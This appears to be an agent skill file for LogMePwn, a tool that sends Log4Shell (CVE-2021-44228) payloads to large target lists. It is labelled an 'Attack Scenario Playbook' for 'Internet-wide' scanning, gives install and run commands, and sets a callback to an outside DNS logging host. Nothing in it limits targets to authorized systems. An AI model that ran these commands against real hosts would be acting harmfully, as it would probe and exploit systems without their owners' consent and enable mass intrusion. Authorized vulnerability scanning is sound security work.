---
name: logmepwn-log4j-mass
description: "LogMePwn: Internet-wide batch Log4Shell scanning. Signals: vulnerability intelligence, CVE, Log4Shell batch, all payloads, threads."
zh-signals: "LogMePwn: Log4Shell 全网批扫。信号:漏洞情报,cve,Log4Shell 批量,全 payload,线程。"
when-to-use: >-
  Use when scanning a large target list for Log4Shell (CVE-2021-44228) with a
  DNS callback, using all payloads and configurable threads.
---

# LogMePwn

- Attack Category: C06 Vulnerability Intelligence and Exploit Databases
- Upstream Repository: https://github.com/0xInfection/LogMePwn
- Upstream License: GPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/0xInfection/LogMePwn && cd LogMePwn && pip install -r requirements.txt
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `lmp -targets urls.txt -callback x.dnslog.cn` | Log4Shell batch scan |
| `-targets file -payload all` | All payloads |
| `-threads 50` | Threads |

## Attack Scenario Playbook

### Internet-wide Log4Shell batch scan

```bash
lmp -targets ips.txt -callback vps.dnslog.cn
# Large-scale CVE-2021-44228
```

## Notes

Batch Log4Shell scanner with multi-protocol support.
